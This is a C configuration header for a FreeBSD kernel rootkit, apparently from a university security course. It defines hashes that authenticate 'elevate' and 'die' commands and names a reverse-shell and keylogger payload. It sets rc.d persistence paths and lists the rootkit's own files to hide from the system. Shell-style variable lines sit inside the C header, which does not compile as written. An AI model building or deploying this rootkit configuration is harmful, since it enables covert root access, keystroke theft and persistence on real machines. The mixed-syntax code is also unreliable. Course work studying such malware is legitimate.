/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef CONFIG_H
#define CONFIG_H

/* See debug.h for available log levels. */
#define LOG_LEVEL LOG_LEVEL_OMIT
#define MODULE_NAME "rootkit"
#define LINKER_NAME "rootkit.ko"

/* Operation hashes.
 * This should be reconfigured for each infection.
 *
 * The rootkit uses unique hashes for each instruction to authenticate and
 * understand instructions. */
#define RKCALL_LEN 64
#define RKCALL_ELEVATE "7c2e28607149c89ec12ede558f021a1428bbe80342249c3febcb15efa6e8e65a"
#define RKCALL_DIE "41580f3e3b18a4dadf03d128b9fa9ab80a5b6ac088ee5f713559fa7ba59c5a6d"


RSHELL="rshell_target"
RSHELL_CONF_FILE="rshell"
KEYLOG="keylog_target"
KEYLOG_CONF_FILE="keylog"
KEYLOG_LOG_FILE="/usr/home/comp6447/keylog_file"

RC_INSTALL_LOCATION="/etc/rc.d/"
RC_CONF_FILE="/etc/rc.conf"
USR_SBIN="/usr/sbin/"


/* Hidden files. */
#define NUM_HIDDEN_FILES 7
static const char *hidden_files[NUM_HIDDEN_FILES] = {
	"/boot/modules/rootkit.ko",
	"/boot/loader.conf.transparent",
	"/usr/home/comp6447/keylog_file",
	"/usr/sbin/rshell_target",
	"/usr/sbin/keylog_target",
	"/etc/rc.d/rshell",
	"/etc/rc.d/keylog"
};

/* Transparent files.
 * Transparent files are files that should not be hidden but must not be
 * viewed or directly edited. */
#define NUM_TRANSPARENT_FILES 1
static const char *transparent_files[NUM_TRANSPARENT_FILES] = {
	"/boot/loader.conf",
};

#endif /* CONFIG_H */
